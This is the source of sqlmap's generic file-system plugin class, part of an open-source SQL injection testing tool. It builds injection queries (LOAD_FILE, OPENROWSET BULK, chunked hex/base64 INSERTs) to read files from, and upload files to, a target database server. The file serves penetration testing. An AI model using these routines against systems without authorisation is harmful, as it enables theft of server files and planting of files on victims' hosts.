#!/usr/bin/env python

"""
Copyright (c) 2006-2013 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import os

from lib.core.agent import agent
from lib.core.common import dataToOutFile
from lib.core.common import Backend
from lib.core.common import decloakToTemp
from lib.core.common import decodeHexValue
from lib.core.common import isNumPosStrValue
from lib.core.common import isListLike
from lib.core.common import isStackingAvailable
from lib.core.common import isTechniqueAvailable
from lib.core.common import readInput
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import DBMS
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import EXPECTED
from lib.core.enums import PAYLOAD
from lib.core.exception import SqlmapUndefinedMethod
from lib.request import inject

class Filesystem:
    """
    This class defines generic OS file system functionalities for plugins.
    """

    def __init__(self):
        self.fileTblName = "sqlmapfile"
        self.tblField = "data"

    def _checkFileLength(self, localFile, remoteFile, fileRead=False):
        if Backend.isDbms(DBMS.MYSQL):
            lengthQuery = "SELECT LENGTH(LOAD_FILE('%s'))" % remoteFile

        elif Backend.isDbms(DBMS.PGSQL) and not fileRead:
            lengthQuery = "SELECT LENGTH(data) FROM pg_largeobject WHERE loid=%d" % self.oid

        elif Backend.isDbms(DBMS.MSSQL):
            self.createSupportTbl(self.fileTblName, self.tblField, "VARBINARY(MAX)")
            inject.goStacked("INSERT INTO %s(%s) SELECT %s FROM OPENROWSET(BULK '%s', SINGLE_BLOB) AS %s(%s)" % (self.fileTblName, self.tblField, self.tblField, remoteFile, self.fileTblName, self.tblField));

            lengthQuery = "SELECT DATALENGTH(%s) FROM %s" % (self.tblField, self.fileTblName)

        localFileSize = os.path.getsize(localFile)

        if fileRead and Backend.isDbms(DBMS.PGSQL):
            logger.info("length of read file %s cannot be checked on PostgreSQL" % remoteFile)
            sameFile = True
        else:
            logger.debug("checking the length of the remote file %s" % remoteFile)
            remoteFileSize = inject.getValue(lengthQuery, resumeValue=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)
            sameFile = None

            if isNumPosStrValue(remoteFileSize):
                remoteFileSize = long(remoteFileSize)
                sameFile = False

                if localFileSize == remoteFileSize:
                    sameFile = True
                    infoMsg = "the local file %s and the remote file " % localFile
                    infoMsg += "%s has the same size" % remoteFile
                elif remoteFileSize > localFileSize:
                    infoMsg = "the remote file %s is larger than " % remoteFile
                    infoMsg += "the local file %s" % localFile
                else:
                    infoMsg = "the remote file %s is smaller than " % remoteFile
                    infoMsg += "file '%s' (%d bytes)" % (localFile, localFileSize)

                logger.info(infoMsg)
            else:
                sameFile = False
                warnMsg = "it looks like the file has not been written, this "
                warnMsg += "can occur if the DBMS process' user has no write "
                warnMsg += "privileges in the destination path"
                logger.warn(warnMsg)

        return sameFile

    def fileToSqlQueries(self, fcEncodedList):
        """
        Called by MySQL and PostgreSQL plugins to write a file on the
        back-end DBMS underlying file system
        """

        counter = 0
        sqlQueries = []

        for fcEncodedLine in fcEncodedList:
            if counter == 0:
                sqlQueries.append("INSERT INTO %s(%s) VALUES (%s)" % (self.fileTblName, self.tblField, fcEncodedLine))
            else:
                updatedField = agent.simpleConcatenate(self.tblField, fcEncodedLine)
                sqlQueries.append("UPDATE %s SET %s=%s" % (self.fileTblName, self.tblField, updatedField))

            counter += 1

        return sqlQueries

    def fileEncode(self, fileName, encoding, single):
        """
        Called by MySQL and PostgreSQL plugins to write a file on the
        back-end DBMS underlying file system
        """

        retVal = []
        with open(fileName, "rb") as f:
            content = f.read().encode(encoding).replace("\n", "")

        if not single:
            if len(content) > 256:
                for i in xrange(0, len(content), 256):
                    _ = content[i:i + 256]

                    if encoding == "hex":
                        _ = "0x%s" % _
                    elif encoding == "base64":
                        _ = "'%s'" % _

                    retVal.append(_)

        if not retVal:
            if encoding == "hex":
                content = "0x%s" % content
            elif encoding == "base64":
                content = "'%s'" % content

            retVal = [content]

        return retVal

    def askCheckWrittenFile(self, localFile, remoteFile, forceCheck=False):
        output = None

        if forceCheck is not True:
            message = "do you want confirmation that the local file '%s' " % localFile
            message += "has been successfully written on the back-end DBMS "
            message += "file system (%s)? [Y/n] " % remoteFile
            output = readInput(message, default="Y")

        if forceCheck or (output and output.lower() == "y"):
            return self._checkFileLength(localFile, remoteFile)

        return True

    def askCheckReadFile(self, localFile, remoteFile):
        message = "do you want confirmation that the remote file '%s' " % remoteFile
        message += "has been successfully downloaded from the back-end "
        message += "DBMS file system? [Y/n] "
        output = readInput(message, default="Y")

        if not output or output in ("y", "Y"):
            return self._checkFileLength(localFile, remoteFile, True)

        return None

    def nonStackedReadFile(self, remoteFile):
        errMsg = "'nonStackedReadFile' method must be defined "
        errMsg += "into the specific DBMS plugin"
        raise SqlmapUndefinedMethod(errMsg)

    def stackedReadFile(self, remoteFile):
        errMsg = "'stackedReadFile' method must be defined "
        errMsg += "into the specific DBMS plugin"
        raise SqlmapUndefinedMethod(errMsg)

    def unionWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        errMsg = "'unionWriteFile' method must be defined "
        errMsg += "into the specific DBMS plugin"
        raise SqlmapUndefinedMethod(errMsg)

    def stackedWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        errMsg = "'stackedWriteFile' method must be defined "
        errMsg += "into the specific DBMS plugin"
        raise SqlmapUndefinedMethod(errMsg)

    def readFile(self, remoteFiles):
        localFilePaths = []

        self.checkDbmsOs()

        for remoteFile in remoteFiles.split(","):
            fileContent = None
            kb.fileReadMode = True

            if conf.direct or isStackingAvailable():
                if isStackingAvailable():
                    debugMsg = "going to read the file with stacked query SQL "
                    debugMsg += "injection technique"
                    logger.debug(debugMsg)

                fileContent = self.stackedReadFile(remoteFile)
            elif Backend.isDbms(DBMS.MYSQL):
                debugMsg = "going to read the file with a non-stacked query "
                debugMsg += "SQL injection technique"
                logger.debug(debugMsg)

                fileContent = self.nonStackedReadFile(remoteFile)
            else:
                errMsg = "none of the SQL injection techniques detected can "
                errMsg += "be used to read files from the underlying file "
                errMsg += "system of the back-end %s server" % Backend.getDbms()
                logger.error(errMsg)

                fileContent = None

            kb.fileReadMode = False

            if fileContent in (None, "") and not Backend.isDbms(DBMS.PGSQL):
                self.cleanup(onlyFileTbl=True)
            elif isListLike(fileContent):
                newFileContent = ""

                for chunk in fileContent:
                    if isListLike(chunk):
                        if len(chunk) > 0:
                            chunk = chunk[0]
                        else:
                            chunk = ""

                    if chunk:
                        newFileContent += chunk

                fileContent = newFileContent

            if fileContent is not None:
                fileContent = decodeHexValue(fileContent)

                if fileContent:
                    localFilePath = dataToOutFile(remoteFile, fileContent)

                    if not Backend.isDbms(DBMS.PGSQL):
                        self.cleanup(onlyFileTbl=True)

                    sameFile = self.askCheckReadFile(localFilePath, remoteFile)

                    if sameFile is True:
                        localFilePath += " (same file)"
                    elif sameFile is False:
                        localFilePath += " (size differs from remote file)"

                    localFilePaths.append(localFilePath)
                else:
                    errMsg = "no data retrieved"
                    logger.error(errMsg)

        return localFilePaths

    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):
        written = False

        self.checkDbmsOs()

        if localFile.endswith('_'):
            localFile = decloakToTemp(localFile)

        if conf.direct or isStackingAvailable():
            if isStackingAvailable():
                debugMsg = "going to upload the %s file with " % fileType
                debugMsg += "stacked query SQL injection technique"
                logger.debug(debugMsg)

            written = self.stackedWriteFile(localFile, remoteFile, fileType, forceCheck)
            self.cleanup(onlyFileTbl=True)
        elif isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION) and Backend.isDbms(DBMS.MYSQL):
            debugMsg = "going to upload the %s file with " % fileType
            debugMsg += "UNION query SQL injection technique"
            logger.debug(debugMsg)

            written = self.unionWriteFile(localFile, remoteFile, fileType, forceCheck)
        else:
            errMsg = "none of the SQL injection techniques detected can "
            errMsg += "be used to write files to the underlying file "
            errMsg += "system of the back-end %s server" % Backend.getDbms()
            logger.error(errMsg)

            return None

        return written
